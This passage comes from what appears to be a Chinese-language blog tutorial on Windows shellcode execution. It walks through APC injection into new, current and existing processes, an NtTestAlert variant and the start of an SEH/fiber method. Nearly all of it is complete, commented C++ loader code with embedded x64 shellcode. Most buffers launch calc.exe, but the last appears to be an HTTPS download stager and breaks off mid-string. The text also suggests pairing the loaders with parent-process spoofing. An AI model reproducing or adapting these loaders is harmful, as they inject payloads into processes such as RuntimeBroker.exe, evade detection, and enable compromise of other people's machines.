<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOA)&amp;si, (LPPROCESS_INFORMATION)&amp;pi);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在目标进程中分配内存块，用于存储外部代码或数据。</span></span><br><span class="line">  <span class="comment">// 参数包括目标进程句柄，所需地址（NULL 表示由系统决定），</span></span><br><span class="line">  <span class="comment">// 大小（0x1000 字节），内存分配类型（MEM_RESERVE | MEM_COMMIT 表示保留和提交），</span></span><br><span class="line">  <span class="comment">// 保护属性（PAGE_EXECUTE_READWRITE 允许执行、读取和写入）。</span></span><br><span class="line">  LPVOID lpBaseAddress = (LPVOID)<span class="built_in">VirtualAllocEx</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将外部代码或数据写入目标进程的内存中。</span></span><br><span class="line">  <span class="comment">// 参数包括目标进程句柄，目标地址，源数据的指针，数据大小，</span></span><br><span class="line">  <span class="comment">// 以及用于接收写入的字节数（NULL 表示忽略该信息）。</span></span><br><span class="line">  <span class="built_in">WriteProcessMemory</span>(pi.hProcess, lpBaseAddress, (LPVOID)buf, <span class="built_in">sizeof</span>(buf), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将 APC（异步过程调用）排入目标线程的 APC 队列中，指定要执行的函数地址。</span></span><br><span class="line">  <span class="comment">// 当线程进入可警报状态时，将执行此函数。</span></span><br><span class="line">  <span class="comment">// 参数包括 APC 函数指针，目标线程句柄，以及用户数据（NULL 表示无）。</span></span><br><span class="line">  <span class="built_in">QueueUserAPC</span>((PAPCFUNC)lpBaseAddress, pi.hThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 恢复挂起的线程，使其开始执行。</span></span><br><span class="line">  <span class="comment">// 这将导致线程运行，并最终执行排入的 APC。</span></span><br><span class="line">  <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 关闭线程句柄，释放系统资源。</span></span><br><span class="line">  <span class="comment">// 在不再需要进一步操作后进行，避免资源泄漏。</span></span><br><span class="line">  <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>可配合父进程伪造、当前目录伪造</strong></p>
<h3 id="新建一个进程-在进程内创建一个挂起的线程-往这个线程内插入APC注入-随后恢复进程"><a href="#新建一个进程-在进程内创建一个挂起的线程-往这个线程内插入APC注入-随后恢复进程" class="headerlink" title="新建一个进程,在进程内创建一个挂起的线程,往这个线程内插入APC注入,随后恢复进程"></a>新建一个进程,在进程内创建一个挂起的线程,往这个线程内插入APC注入,随后恢复进程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">  HANDLE hThread = <span class="literal">NULL</span>;  <span class="comment">// 定义一个线程句柄，用于储存新创建线程的句柄。</span></span><br><span class="line">  HANDLE hProcess = <span class="number">0</span>;  <span class="comment">// 定义一个进程句柄，初始化为0。</span></span><br><span class="line">  DWORD ProcessId = <span class="number">0</span>;  <span class="comment">// 定义一个用于存储进程 ID 的变量（未使用）。</span></span><br><span class="line">  LPVOID AllocAddr = <span class="literal">NULL</span>;  <span class="comment">// 定义一个指针，用于存储分配的内存地址。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取当前进程的句柄并赋值给 hProcess。</span></span><br><span class="line">  hProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在当前进程中分配一块内存，大小为 buf 的大小加 1 字节。</span></span><br><span class="line">  <span class="comment">// MEM_COMMIT 表示提交物理内存，PAGE_EXECUTE_READWRITE 表示允许执行、读取和写入。</span></span><br><span class="line">  AllocAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf) + <span class="number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将 buf 中的数据写入到当前进程的分配内存中。</span></span><br><span class="line">  <span class="comment">// 参数包括目标进程句柄，目标地址，源数据的指针，数据大小，以及接收写入的字节数（0 表示不需要）。</span></span><br><span class="line">  <span class="built_in">WriteProcessMemory</span>(hProcess, AllocAddr, buf, <span class="built_in">sizeof</span>(buf) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建一个新的线程，并使其最初处于挂起状态。</span></span><br><span class="line">  <span class="comment">// 线程函数指针被设置为 0xfff，这是一个无效地址，通常会导致未定义行为。</span></span><br><span class="line">  <span class="comment">// 返回的新线程句柄被存储在 hThread 中。</span></span><br><span class="line">  hThread = <span class="built_in">CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)<span class="number">0xfff</span>, <span class="number">0</span>, CREATE_SUSPENDED, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将 APC 函数（在 AllocAddr 中）排入新线程的 APC 队列。</span></span><br><span class="line">  <span class="comment">// 当线程进入可警报状态时，将执行此函数。</span></span><br><span class="line">  <span class="built_in">QueueUserAPC</span>((PAPCFUNC)AllocAddr, hThread, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 恢复挂起的线程，使其开始运行。</span></span><br><span class="line">  <span class="comment">// 这将导致线程运行，并执行排入的 APC。</span></span><br><span class="line">  <span class="built_in">ResumeThread</span>(hThread);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 等待线程完成执行。</span></span><br><span class="line">  <span class="comment">// INFINITE 表示无限等待，直到线程结束。</span></span><br><span class="line">  <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 关闭进程句柄，释放资源。</span></span><br><span class="line">  <span class="comment">// 由于 hProcess 是当前进程的句柄，应该使用 CloseHandle 释放。</span></span><br><span class="line">  <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 关闭线程句柄，释放资源。</span></span><br><span class="line">  <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="新建一个进程-在进程内创建一个挂起的线程-往这个线程内插入APC注入-利用未记录的ntdll中的NtTestAlert执行Shellcode-随后恢复进程"><a href="#新建一个进程-在进程内创建一个挂起的线程-往这个线程内插入APC注入-利用未记录的ntdll中的NtTestAlert执行Shellcode-随后恢复进程" class="headerlink" title="新建一个进程,在进程内创建一个挂起的线程,往这个线程内插入APC注入,利用未记录的ntdll中的NtTestAlert执行Shellcode,随后恢复进程"></a>新建一个进程,在进程内创建一个挂起的线程,往这个线程内插入APC注入,利用未记录的ntdll中的NtTestAlert执行Shellcode,随后恢复进程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ntdll&quot;</span>)</span></span><br><span class="line"><span class="comment">// 定义一个函数指针类型 myNtTestAlert，该指针指向一个无参数、返回类型为 NTSTATUS 的函数。</span></span><br><span class="line"><span class="comment">// NTAPI 是一种调用约定，通常在 Windows API 中使用，以确保函数参数以特定顺序入栈。</span></span><br><span class="line"><span class="keyword">using</span> myNtTestAlert = <span class="built_in">NTSTATUS</span>(NTAPI*)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line">  <span class="comment">// 获取 ntdll 模块中的 NtTestAlert 函数地址。</span></span><br><span class="line">  <span class="comment">// 通过 GetModuleHandleA 获取 ntdll 的模块句柄，然后使用 GetProcAddress 获取 NtTestAlert 函数地址。</span></span><br><span class="line">  <span class="comment">// 将获取的地址转换为 myNtTestAlert 类型的函数指针。</span></span><br><span class="line">  myNtTestAlert testAlert = (myNtTestAlert)(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;NtTestAlert&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 定义一个变量 shellSize，用于存储缓冲区 buf 的大小。</span></span><br><span class="line">  SIZE_T shellSize = <span class="built_in">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在当前进程中分配一块可执行的内存，用于存储和执行 shellcode。</span></span><br><span class="line">  <span class="comment">// MEM_COMMIT 用于提交内存，PAGE_EXECUTE_READWRITE 允许执行、读取和写入。</span></span><br><span class="line">  LPVOID shellAddress = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将 buf 中的数据写入到分配的内存中。</span></span><br><span class="line">  <span class="comment">// 参数包括目标进程（当前进程）、目标地址（shellAddress）、源数据的指针、数据大小以及接收写入的字节数（NULL 表示不需要）。</span></span><br><span class="line">  <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), shellAddress, buf, shellSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将 shellAddress 转换为 PTHREAD_START_ROUTINE 类型的指针，指向线程的开始地址。</span></span><br><span class="line">  PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将 APC 函数（在 shellAddress 中）排入当前线程的 APC 队列。</span></span><br><span class="line">  <span class="comment">// 当线程进入可警报状态时，将执行此函数。</span></span><br><span class="line">  <span class="built_in">QueueUserAPC</span>((PAPCFUNC)apcRoutine, <span class="built_in">GetCurrentThread</span>(), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用 NtTestAlert 函数，触发 APC 调度，执行排入的 APC 函数。</span></span><br><span class="line">  <span class="built_in">testAlert</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="在已有进程内创建一个挂起的线程-往这个线程内插入APC注入-随后恢复进程"><a href="#在已有进程内创建一个挂起的线程-往这个线程内插入APC注入-随后恢复进程" class="headerlink" title="在已有进程内创建一个挂起的线程,往这个线程内插入APC注入,随后恢复进程"></a>在已有进程内创建一个挂起的线程,往这个线程内插入APC注入,随后恢复进程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 描述：根据进程名获取进程ID</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetProcessIDByName</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* processName)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个快照，获取系统中所有的进程</span></span><br><span class="line">    HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 创建快照失败，返回0表示错误</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 processEntry = &#123; <span class="built_in">sizeof</span>(PROCESSENTRY32) &#125;; <span class="comment">// 初始化PROCESSENTRY32结构</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapshot, &amp;processEntry)) &#123; <span class="comment">// 获取第一个进程信息</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// 比较进程名，_wcsicmp为不区分大小写的宽字符字符串比较</span></span><br><span class="line">            <span class="keyword">if</span> (_wcsicmp(processEntry.szExeFile, processName) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">CloseHandle</span>(hSnapshot); <span class="comment">// 找到匹配的进程名后，关闭快照句柄</span></span><br><span class="line">                <span class="keyword">return</span> processEntry.th32ProcessID; <span class="comment">// 返回找到的进程ID</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;processEntry)); <span class="comment">// 遍历下一个进程</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hSnapshot); <span class="comment">// 关闭快照句柄</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 未找到匹配的进程名，返回0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line">    DWORD ProcessId = <span class="number">0</span>;</span><br><span class="line">    LPVOID AllocAddr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 目标进程名</span></span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* targetProcessName = <span class="string">L&quot;RuntimeBroker.exe&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取目标进程的ID</span></span><br><span class="line">    <span class="type">int</span> processID = <span class="built_in">GetProcessIDByName</span>(targetProcessName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开目标进程，获取句柄</span></span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, processID);</span><br><span class="line">    <span class="comment">// 在目标进程中分配内存，允许执行、读取和写入</span></span><br><span class="line">    AllocAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf) + <span class="number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">// 将数据（通常为shellcode）写入目标进程分配的内存</span></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, AllocAddr, buf, <span class="built_in">sizeof</span>(buf) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建远程线程，初始状态为挂起</span></span><br><span class="line">    hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)<span class="number">0xfff</span>, <span class="number">0</span>, CREATE_SUSPENDED, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 APC 函数排入远程线程的 APC 队列中</span></span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)AllocAddr, hThread, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 恢复线程的执行</span></span><br><span class="line">    <span class="built_in">ResumeThread</span>(hThread);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭句柄以释放资源</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="SHE结构化异常执行-SEH"><a href="#SHE结构化异常执行-SEH" class="headerlink" title="SHE结构化异常执行-SEH"></a>SHE结构化异常执行-SEH</h2><blockquote>
<p>​	SEH(Structured Exception Handling)结构化异常处理,是windows操作系统默认的错误处理机制，它允许我们在程序产所错误时使用特定的异常处理函数处理这个异常，尽管提供的功能预取为处理异常，但由于其功能的特点，也往往大量用于反调试。</p>
</blockquote>
<p><strong>异常发生时,执行异常代码的线程会发生中断,转而运行SEH,此时操作系统会把线程CONTEXT结构体的指针传递给异常处理函数的相应参数.由于这个处理函数可以自定义,所以可以利用操作系统来帮助执行shellcode.</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	PVOID mainFiber = <span class="built_in">ConvertThreadToFiber</span>(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xe9\x93\x00\x00\x00\x5a\x48\x89\xc1\x41\xb8\xbb\x01\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x79\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x32\xc0\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\xba\x1f\x00\x00\x00\x6a\x00\x68\x80\x33\x00\x00\x49\x89\xe0\x41\xb9\x04\x00\x00\x00\x41\xba\x75\x46\x9e\x86\xff\xd5\x48\x89\